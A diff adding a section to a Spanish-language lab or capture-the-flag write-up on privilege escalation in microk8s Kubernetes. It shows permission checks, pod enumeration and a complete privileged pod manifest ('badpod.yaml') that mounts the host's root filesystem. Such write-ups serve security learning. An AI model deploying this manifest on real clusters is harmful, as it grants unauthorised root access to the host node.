@@ -318,9 +318,73 @@ Por lo que ya hemos completado la fase de explotacion de la maquina hemos obteni
     Informacion mas que suficiente para ver que esta corriendo microk8s|kubernetes en la maquina.
    
 
-- Elevamos privilegios mediante, Microk8s Kubernetes Pod. Info: https://bishopfox.com/blog/kubernetes-pod-privilege-escalation
+- Elevamos privilegios mediante Microk8s Kubernetes Pod. Info: https://bishopfox.com/blog/kubernetes-pod-privilege-escalation
 
-    1) ww
+  1)Listamos los permisos que tenemos en el espacio de trabajo actual
+
+      # Check to see if I can do everything in my current namespace ("*" means all)
+
+        frank@dev-01:/home/herby$ microk8s kubectl auth can-i '*' '*'
+      yes
+
+    Por lo que podemos hacer y desacer a nuestro antojo.
+
+  2)Obtenemos informacion namespace,nodo y pods
+
+        frank@dev-01:/home/herby$ microk8s kubectl get namespace
+        NAME                 STATUS   AGE
+        kube-system          Active   679d
+        kube-public          Active   679d
+        kube-node-lease      Active   679d
+        default              Active   679d
+        container-registry   Active   679d
+  
+        frank@dev-01:/home/herby$ microk8s kubectl get node
+        NAME     STATUS   ROLES    AGE    VERSION
+        dev-01   Ready    <none>   679d   v1.21.5-3+83e2bb7ee39726
+  
+        frank@dev-01:/home/herby$ microk8s kubectl get pods
+        NAME                                READY   STATUS    RESTARTS   AGE
+        nginx-deployment-7b548976fd-77v4r   1/1     Running   2          654d
+
+    obtenemos la informacion que necesitamos del pod que esta corriendo, con la ayuda de esa info montaremos el nuestro.
+
+      frank@dev-01:/home/herby$ microk8s kubectl describe pods | grep -Eiw 'name:|node:|image:'
+        Name:         nginx-deployment-7b548976fd-77v4r
+        Node:         dev-01/10.10.209.46
+            Image:          localhost:32000/bsnginx
+
+
+  3)badpod.yaml, nos va a permitir en el directorio /host del pod cargar el sistema raiz del host(nodo), por lo que tendremos acceso total al sistema de ficheros.
+
+  Estructura de badpod.yaml
+
+          apiVersion: v1
+        kind: Pod
+        metadata:
+          name: esevka
+          labels:
+            app: pentest
+        spec:
+          hostNetwork: true
+          hostPID: true
+          hostIPC: true
+          containers:
+          - name: esevka
+            image: localhost:32000/bsnginx
+            securityContext:
+              privileged: true
+            volumeMounts:
+            - mountPath: /host
+              name: noderoot
+            command: [ "/bin/bash", "-c", "--" ]
+            args: [ "while true; do sleep 30; done;" ]
+          volumes:
+          - name: noderoot
+            hostPath:
+              path: /
+
+      
 
 
 
